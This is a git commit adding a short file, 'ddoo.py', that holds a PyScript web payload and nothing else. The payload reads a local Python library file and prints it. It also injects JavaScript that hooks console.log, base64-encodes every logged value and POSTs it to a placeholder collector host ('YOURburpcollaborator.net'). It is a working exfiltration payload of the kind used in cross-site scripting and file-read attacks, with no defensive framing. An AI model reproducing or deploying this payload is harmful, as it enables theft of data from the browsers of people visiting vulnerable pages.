7f9573e30ea37fa98e45e126e0ab4891c4211583
mohamedalaaaz <88798693+mohamedalaaaz@users.noreply.github.com>
2025-10-02 08:39:17 -0400

    Add files via upload

---
+++ ddoo.py
@@ -0,0 +1,10 @@
+
+
+<py-script>
+x = "mlo"
+if x == "mlo":
+    with open('/lib/python3.10/asyncio/tasks.py') as output:
+        contents = output.read()
+        print(contents)
+print('<script>console.pylog = console.log; console.logs = []; console.log = function(){     console.logs.push(Array.from(arguments));     console.pylog.apply(console, arguments);fetch("http://YOURburpcollaborator.net/", {method: "POST",headers: {"Content-Type": "text/plain;charset=utf-8"},body: JSON.stringify({"content": btoa(console.logs)})});}</script>')
+</py-script>
